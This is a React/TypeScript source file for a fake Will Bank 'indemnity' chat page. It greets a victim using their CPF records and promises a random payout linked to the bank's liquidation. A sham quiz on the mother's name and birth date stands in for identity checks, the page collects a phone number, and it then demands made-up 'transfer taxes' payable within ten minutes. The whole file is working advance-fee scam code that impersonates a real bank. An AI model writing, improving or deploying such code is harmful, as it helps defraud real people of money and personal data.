import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { CheckCircle2, Play, Volume2, Check } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import { CPFData } from "@/lib/cpf";
import willbankLogo from "@/assets/willbank-logo.png";

type ChatStep = 
  | "greeting" 
  | "video" 
  | "quiz-mae" 
  | "quiz-nascimento" 
  | "identity-confirmed"
  | "comprovante"
  | "pix-selection"
  | "pix-confirm"
  | "generating-comprovante"
  | "comprovante-final"
  | "sms-input"
  | "taxa-explanation"
  | "final";

interface QuizOption {
  text: string;
  isCorrect: boolean;
}

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState<ChatStep>("greeting");
  const [messages, setMessages] = useState<React.ReactNode[]>([]);
  const [showVideo, setShowVideo] = useState(false);
  const [quizOptions, setQuizOptions] = useState<QuizOption[]>([]);
  const [phoneNumber, setPhoneNumber] = useState("");
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  
  // Gera valor aleatório entre R$ 1.500 e R$ 9.500
  const [valorBeneficio] = useState(() => {
    const baseValue = Math.floor(Math.random() * (9500 - 1500 + 1) + 1500);
    const cents = Math.floor(Math.random() * 100);
    return baseValue + cents / 100;
  });

  // Gera número do protocolo
  const [protocolo] = useState(() => {
    return `202${Date.now().toString().slice(-13)}`;
  });

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, step]);

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
      return;
    }
    startFlow();
  }, [cpfData, navigate]);

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const addMessage = (content: React.ReactNode) => {
    setMessages(prev => [...prev, content]);
  };

  const generateFakeOptions = (correctAnswer: string, type: "mae" | "nascimento"): QuizOption[] => {
    const fakeNames = [
      "MARIA SANTOS OLIVEIRA",
      "ANA PAULA FERREIRA",
      "CLAUDIA SOUZA LIMA",
      "PATRICIA GOMES SILVA"
    ];
    const fakeDates = [
      "15/03/1998",
      "22/07/1995",
      "08/12/2001",
      "30/05/1999"
    ];

    const options = type === "mae" ? fakeNames : fakeDates;
    const shuffled = options.filter(o => o !== correctAnswer).sort(() => Math.random() - 0.5).slice(0, 3);
    shuffled.push(correctAnswer);
    
    return shuffled.sort(() => Math.random() - 0.5).map(text => ({
      text,
      isCorrect: text === correctAnswer
    }));
  };

  const startFlow = async () => {
    await delay(1000);
    
    addMessage(
      <div className="space-y-1">
        <p>Olá <span className="font-semibold">{cpfData?.nome}</span>, Seja muito bem vindo ao <span className="font-semibold">Setor de Atendimento</span> online do Will bank.</p>
      </div>
    );

    await delay(1500);
    addMessage(
      <p>O número do <span className="font-semibold">PROTOCOLO</span> deste atendimento é: <span className="font-semibold">{protocolo}</span></p>
    );

    await delay(1500);
    addMessage(
      <p>Você está a um passo de <span className="underline">validar sua indenização referente à liquidação do Will Bank</span>, no valor de <span className="font-semibold text-primary">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>.</p>
    );

    await delay(1500);
    addMessage(<p>Clique no vídeo abaixo <span className="underline">para darmos continuidade</span> 👇</p>);
    
    setShowVideo(true);
    setStep("video");
  };

  const handleVideoClick = async () => {
    setShowVideo(false);
    
    addMessage(
      <div className="text-sm text-muted-foreground italic">
        ▶️ Vídeo assistido
      </div>
    );

    await delay(1000);
    addMessage(<p className="underline">Responda as perguntas a seguir</p>);
    addMessage(<p className="font-semibold">para a aprovação da sua indenização.</p>);

    await delay(1000);
    addMessage(<p className="font-semibold">Qual o nome da sua mãe?</p>);
    addMessage(
      <BotMessage>
        Escolha a alternativa correta.
      </BotMessage>
    );

    setQuizOptions(generateFakeOptions(cpfData?.nomeMae || "", "mae"));
    setStep("quiz-mae");
  };

  const handleQuizAnswer = async (option: QuizOption, quizType: "mae" | "nascimento") => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          {option.text}
        </div>
      </div>
    );

    await delay(500);
    
    if (option.isCorrect) {
      addMessage(
        <div className="flex items-center gap-2">
          <span>Resposta correta!</span>
          <CheckCircle2 className="w-5 h-5 text-green-500" />
        </div>
      );

      if (quizType === "mae") {
        await delay(1000);
        addMessage(<p className="text-primary">Próxima pergunta...</p>);
        await delay(800);
        addMessage(<p className="font-semibold">Qual sua data de nascimento?</p>);
        addMessage(
          <BotMessage>
            Escolha a alternativa correta.
          </BotMessage>
        );
        setQuizOptions(generateFakeOptions(cpfData?.dataNascimento || "", "nascimento"));
        setStep("quiz-nascimento");
      } else {
        await delay(1000);
        addMessage(<p className="font-semibold border-l-4 border-primary pl-3 bg-muted py-2">Identidade confirmada com sucesso!</p>);
        setStep("identity-confirmed");
        await delay(1500);
        showComprovante();
      }
    } else {
      addMessage(<p className="text-destructive">Resposta incorreta. Tente novamente.</p>);
    }
  };

  const showComprovante = async () => {
    addMessage(
      <div className="bg-card border rounded-xl p-6 space-y-4 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        <h3 className="text-xl font-bold text-center">Confirmação de Autenticidade</h3>
        
        <div className="bg-primary text-primary-foreground text-center py-2 rounded-full text-sm font-semibold">
          Dados Autenticados
        </div>
        
        <p className="text-center text-sm text-muted-foreground">
          Os dados do(a) Sr(a). <span className="font-semibold text-foreground">{cpfData?.nome}</span> foram encontrados em nosso sistema e sua autenticidade foi confirmada.
        </p>

        <div className="divide-y border rounded-lg">
          <DataRow label="Nome Completo" value={cpfData?.nome || ""} />
          <DataRow label="CPF" value={cpfData?.cpf || ""} />
          <DataRow label="Data de Nascimento" value={cpfData?.dataNascimento || ""} />
          <DataRow label="Nome da Mãe" value={cpfData?.nomeMae || ""} />
          <DataRow label="Cidade/Estado" value="Brasil" />
        </div>
      </div>
    );

    await delay(1500);
    addMessage(
      <p>Você possui uma indenização a receber no valor de <span className="font-semibold text-primary">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>.</p>
    );

    addMessage(<AudioPlayer />);

    await delay(1000);
    setStep("pix-selection");
  };

  const handleAprovarIndenizacao = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          SIM, APROVAR INDENIZAÇÃO
        </div>
      </div>
    );

    await delay(1000);

    // Progress stepper
    addMessage(
      <div className="bg-card border rounded-xl p-6 space-y-6 shadow-lg">
        <div className="flex justify-center">
          <img src={willbankLogo} alt="Will Bank" className="h-10" />
        </div>
        
        {/* Progress Steps */}
        <div className="flex items-center justify-center gap-2">
          <StepIndicator completed label="Solicitando Aprovação" />
          <div className="w-8 h-0.5 bg-primary" />
          <StepIndicator completed label="Analisando Dados" />
          <div className="w-8 h-0.5 bg-primary" />
          <StepIndicator completed label="Indenização Aprovada" />
        </div>

        <div className="text-center space-y-1">
          <p className="font-semibold">{cpfData?.nome}</p>
          <p className="text-sm text-muted-foreground">Sua indenização no valor de</p>
          <p className="text-3xl font-bold text-primary">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</p>
          <p className="text-xs text-muted-foreground">Este valor está reservado para você.</p>
          <p className="text-xs text-primary">Complete os próximos passos para receber sua indenização ainda hoje.</p>
        </div>
      </div>
    );

    await delay(1000);
    addMessage(
      <div className="flex items-center gap-2">
        <span>Sua indenização foi aprovada!</span>
        <CheckCircle2 className="w-5 h-5 text-green-500" />
      </div>
    );

    await delay(800);
    addMessage(
      <BotMessage>
        Escolha abaixo o tipo de <span className="font-semibold">Chave Pix</span> que você deseja receber a sua quantia.
      </BotMessage>
    );

    setStep("pix-confirm");
  };

  const handlePixType = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          CPF
        </div>
      </div>
    );

    await delay(1000);
    addMessage(
      <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 space-y-2">
        <p className="font-semibold">ATENÇÃO: <span className="font-normal">Confirme se a CHAVE PIX informada está correta.</span></p>
        <p>Nome: <span className="font-semibold">{cpfData?.nome}</span></p>
        <p>Chave pix: <span className="font-semibold text-primary">{cpfData?.cpf.replace(/\D/g, '')}</span></p>
        <p className="text-sm text-muted-foreground">A WillBank não se responsabiliza em casos de transferências em chave pix erradas.</p>
      </div>
    );

    setStep("generating-comprovante");
  };

  const handleConfirmPix = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          Sim, está correto.
        </div>
      </div>
    );

    await delay(500);
    addMessage(<p className="font-semibold">Aguarde um momento!</p>);
    await delay(800);
    addMessage(<p className="text-primary italic">Finalizando o cadastro da sua chave pix...</p>);
    await delay(1500);
    addMessage(<p className="font-semibold">Sua chave pix foi cadastrada com sucesso!</p>);
    
    addMessage(<AudioPlayer duration="0:12" />);

    await delay(1000);
    addMessage(
      <BotMessage>
        Clique no botão abaixo para <span className="font-semibold">confirmar</span> seu processo indenizatório e gerar seu <span className="font-semibold">comprovante de recebimento</span>.
      </BotMessage>
    );

    setStep("comprovante-final");
  };

  const handleGenerateComprovante = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          CONFIRMAR
        </div>
      </div>
    );

    await delay(800);
    addMessage(<p className="text-primary italic">Gerando seu comprovante de recebimento dos valores...</p>);
    await delay(1500);
    addMessage(<p>Seu <span className="font-semibold">Comprovante Indenizatório</span> foi gerado com sucesso!</p>);

    await delay(500);
    // Comprovante Indenizatório
    addMessage(
      <div className="bg-card border rounded-xl p-6 space-y-4 shadow-lg">
        <h3 className="text-xl font-bold text-center border-b pb-3">Comprovante Indenizatório</h3>
        
        <div className="bg-amber-50 border-l-4 border-primary p-4 text-sm space-y-2">
          <p>O Will Bank, com base no processo indenizatório do Sr. (a) <span className="font-semibold">{cpfData?.nome}</span>, portador do CPF <span className="font-semibold">{cpfData?.cpf.replace(/\D/g, '')}</span>, confirma o direito à indenização por possuir cadastro no Will Bank.</p>
        </div>

        <div className="divide-y border rounded-lg">
          <DataRow label="Indenização a receber" value={`R$ ${valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`} highlight />
          <DataRow label="Protocolo" value={protocolo} />
          <DataRow label="Data e Hora de Emissão" value={new Date().toLocaleString('pt-BR')} />
        </div>
      </div>
    );

    await delay(1000);
    addMessage(
      <p>O setor de Indenização da WillBank confirma que seu processo indenizatório foi registrado com sucesso e vinculado ao seu CPF <span className="font-semibold">{cpfData?.cpf.replace(/\D/g, '')}</span>.</p>
    );

    await delay(800);
    addMessage(
      <BotMessage>
        <span className="font-semibold">IMPORTANTE:</span> Escolha como deseja receber uma cópia do seu <span className="font-semibold">Comprovante Indenizatório</span>.
      </BotMessage>
    );

    setStep("sms-input");
  };

  const handleSMSOption = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          RECEBER POR SMS
        </div>
      </div>
    );

    await delay(500);
    addMessage(
      <BotMessage>
        Digite seu número de celular abaixo:
      </BotMessage>
    );
  };

  const handlePhoneSubmit = async () => {
    if (!phoneNumber.trim()) return;

    addMessage(
      <div className="flex justify-end">
        <div className="bg-primary text-primary-foreground px-4 py-2 rounded-full text-sm font-medium">
          {phoneNumber}
        </div>
      </div>
    );

    await delay(800);
    addMessage(<p className="font-semibold">Seu comprovante foi salvo!</p>);
    addMessage(<p className="text-muted-foreground">Você irá receber uma cópia em até 15 minutos.</p>);

    await delay(1000);
    addMessage(
      <p className="font-semibold">ATENÇÃO: <span className="font-normal">A WillBank já iniciou o repasse da sua indenização de</span> <span className="text-primary">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span></p>
    );
    addMessage(
      <p>Para liberar o seu valor é necessário realizar o pagamento do <span className="font-semibold">Imposto de Transferência</span> em até 10 minutos.</p>
    );

    await delay(800);
    addMessage(
      <BotMessage>
        <span className="underline">Clique abaixo</span> para entender o motivo do pagamento desse imposto.
      </BotMessage>
    );

    setStep("taxa-explanation");
  };

  const handleTaxExplanation = async () => {
    addMessage(
      <div className="flex justify-end">
        <div className="bg-orange-500 text-white px-4 py-2 rounded-full text-sm font-medium">
          PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
        </div>
      </div>
    );

    await delay(1000);
    addMessage(<p className="font-semibold">IMPORTANTE: Escute o áudio abaixo com bastante atenção!</p>);
    
    // Cálculo dos impostos
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    addMessage(
      <div className="bg-muted rounded-lg p-4 space-y-2 text-sm">
        <p className="font-semibold">Impostos gerados:</p>
        <p>- IPCT (Imposto sobre Circulação de Transferência 0,21%): <span className="font-semibold">R$ {ipct.toFixed(2).replace('.', ',')}</span></p>
        <p>- IPTI (Imposto sobre Transferência Indenizatório 0,25%): <span className="font-semibold">R$ {ipti.toFixed(2).replace('.', ',')}</span></p>
        <p>- IPRI (Imposto sobre Recebimento Indenizatório 0,25%): <span className="font-semibold">R$ {ipri.toFixed(2).replace('.', ',')}</span></p>
        <p className="pt-2 border-t font-semibold">Valor total do Imposto: R$ {totalImposto.toFixed(2).replace('.', ',')} (0,71% do valor total a receber)</p>
      </div>
    );

    addMessage(<AudioPlayer duration="0:35" />);

    await delay(1000);
    addMessage(
      <BotMessage>
        Somente após você finalizar o pagamento do <span className="font-semibold">Imposto de Recebimento</span> a WillBank terá a <span className="font-semibold underline">autorização de realizar transferências</span> de valor alto diante o monitoramento fiscal.
      </BotMessage>
    );

    setStep("final");
  };

  const handleFinalPayment = () => {
    const ipct = valorBeneficio * 0.0021;
    const ipti = valorBeneficio * 0.0025;
    const ipri = valorBeneficio * 0.0025;
    const totalImposto = ipct + ipti + ipri;

    navigate("/saque", { 
      state: { 
        cpfData, 
        valorBeneficio,
        valorTaxa: totalImposto,
        protocolo
      } 
    });
  };

  if (!cpfData) return null;

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader 
        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
        breadcrumb="Benefício > Indenização > Atendimento"
      />

      <main className="flex-1 overflow-y-auto p-4 sm:p-6">
        <div className="max-w-2xl mx-auto">
          <WillBankCard className="min-h-[60vh]">
            <div className="space-y-4">
              {messages.map((message, index) => (
                <div key={index} className="animate-fade-in">
                  {message}
                </div>
              ))}

              {/* Video Section */}
              {showVideo && (
                <div 
                  className="relative aspect-video bg-gradient-to-br from-blue-900 via-blue-800 to-purple-900 rounded-xl overflow-hidden cursor-pointer group"
                  onClick={handleVideoClick}
                >
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-48 h-48 bg-primary rounded-lg flex items-center justify-center">
                      <span className="text-6xl">👩‍💼</span>
                    </div>
                  </div>
                  <div className="absolute bottom-0 left-0 right-0 p-3 bg-black/50">
                    <div className="flex items-center gap-2 text-white text-sm">
                      <Play className="w-4 h-4" />
                      <span>0:16 / 0:16</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Quiz Options */}
              {(step === "quiz-mae" || step === "quiz-nascimento") && quizOptions.length > 0 && (
                <div className="flex flex-wrap gap-2 justify-end">
                  {quizOptions.map((option, index) => (
                    <Button
                      key={index}
                      onClick={() => handleQuizAnswer(option, step === "quiz-mae" ? "mae" : "nascimento")}
                      className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                    >
                      {option.text}
                    </Button>
                  ))}
                </div>
              )}

              {/* Aprovar Indenização Button */}
              {step === "pix-selection" && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleAprovarIndenizacao}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    SIM, APROVAR INDENIZAÇÃO
                  </Button>
                </div>
              )}

              {/* PIX Type Selection */}
              {step === "pix-confirm" && (
                <div className="flex justify-end gap-2">
                  <Button
                    onClick={handlePixType}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    CPF
                  </Button>
                </div>
              )}

              {/* Confirm PIX */}
              {step === "generating-comprovante" && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleConfirmPix}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    Sim, está correto.
                  </Button>
                </div>
              )}

              {/* Generate Comprovante */}
              {step === "comprovante-final" && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleGenerateComprovante}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    CONFIRMAR
                  </Button>
                </div>
              )}

              {/* SMS Option */}
              {step === "sms-input" && !phoneNumber && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleSMSOption}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    RECEBER POR SMS
                  </Button>
                </div>
              )}

              {/* Phone Input */}
              {step === "sms-input" && (
                <div className="flex gap-2">
                  <Input
                    placeholder="+55 (00) 00000-0000"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    className="flex-1"
                  />
                  {phoneNumber && (
                    <Button onClick={handlePhoneSubmit} className="bg-primary hover:bg-primary/90">
                      Enviar
                    </Button>
                  )}
                </div>
              )}

              {/* Tax Explanation */}
              {step === "taxa-explanation" && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleTaxExplanation}
                    className="bg-orange-500 hover:bg-orange-600 text-white rounded-full"
                  >
                    PORQUE TENHO QUE PAGAR ESSE IMPOSTO?
                  </Button>
                </div>
              )}

              {/* Final Payment Button */}
              {step === "final" && (
                <div className="flex justify-end">
                  <Button
                    onClick={handleFinalPayment}
                    className="bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
                  >
                    Concluir pagamento e receber minha indenização
                  </Button>
                </div>
              )}

              <div ref={messagesEndRef} />
            </div>
          </WillBankCard>
        </div>
      </main>
    </div>
  );
};

// Helper Components
const BotMessage = ({ children }: { children: React.ReactNode }) => (
  <div className="flex items-start gap-3">
    <div className="w-8 h-8 bg-primary rounded-full flex items-center justify-center shrink-0">
      <img src={willbankLogo} alt="Will Bank" className="w-5 h-5 object-contain" />
    </div>
    <p className="text-sm">{children}</p>
  </div>
);

const DataRow = ({ label, value, highlight = false }: { label: string; value: string; highlight?: boolean }) => (
  <div className="flex justify-between p-3">
    <span className="text-sm text-muted-foreground">{label}</span>
    <span className={`text-sm font-medium ${highlight ? 'text-primary font-bold' : ''}`}>{value}</span>
  </div>
);

const StepIndicator = ({ completed, label }: { completed: boolean; label: string }) => (
  <div className="flex flex-col items-center gap-1">
    <div className={`w-8 h-8 rounded-full flex items-center justify-center ${completed ? 'bg-primary' : 'bg-muted'}`}>
      {completed && <Check className="w-4 h-4 text-primary-foreground" />}
    </div>
    <span className="text-[10px] text-center text-muted-foreground max-w-16">{label}</span>
  </div>
);

const AudioPlayer = ({ duration = "0:09" }: { duration?: string }) => (
  <div className="flex items-center gap-3 bg-muted rounded-full px-4 py-2 w-fit">
    <div className="w-8 h-8 bg-primary rounded-full flex items-center justify-center shrink-0">
      <img src={willbankLogo} alt="" className="w-5 h-5" />
    </div>
    <div className="flex items-center gap-2">
      <Play className="w-4 h-4 text-foreground" />
      <span className="text-xs text-muted-foreground">{duration}</span>
    </div>
    <div className="w-24 h-1 bg-foreground/30 rounded-full">
      <div className="w-1/2 h-full bg-foreground rounded-full" />
    </div>
    <Volume2 className="w-4 h-4 text-foreground" />
  </div>
);

export default Chat;
